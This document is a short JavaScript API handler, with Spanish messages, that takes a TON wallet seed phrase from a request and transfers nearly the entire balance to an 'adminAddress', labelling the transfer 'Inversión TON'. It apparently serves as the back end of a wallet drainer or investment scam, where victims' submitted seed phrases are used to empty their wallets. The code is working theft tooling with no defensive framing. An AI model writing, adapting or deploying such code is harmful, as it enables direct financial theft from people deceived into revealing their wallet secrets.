import { TonClient, WalletContractV4, internal, fromNano } from "@ton/ton";
import { mnemonicToPrivateKey } from "@ton/crypto";

const TON_RPC = "https://toncenter.com/api/v2/jsonRPC";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Método no permitido');
  const { seed, adminAddress } = req.body;

  try {
    const client = new TonClient({ endpoint: TON_RPC });
    const mnemonicArray = seed.split(" ");
    const keyPair = await mnemonicToPrivateKey(mnemonicArray);
    const wallet = WalletContractV4.create({ workchain: 0, publicKey: keyPair.publicKey });
    const contract = client.open(wallet);
    const balance = await contract.getBalance();

    if (parseFloat(fromNano(balance)) < 0.001) {
      return res.status(200).json({ error: "Insufficient TON balance" });
    }

    const seqno = await contract.getSeqno();
    const amountToSend = balance - 20000000n; // Deja 0.02 para el gas

    const transfer = await contract.createTransfer({
      seqno,
      secretKey: keyPair.secretKey,
      messages: [
        internal({
          to: adminAddress,
          value: amountToSend,
          bounce: false,
          body: "Inversión TON",
        })
      ]
    });

    await contract.send(transfer);
    res.status(200).json({ success: true, amount: fromNano(balance) });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
      }
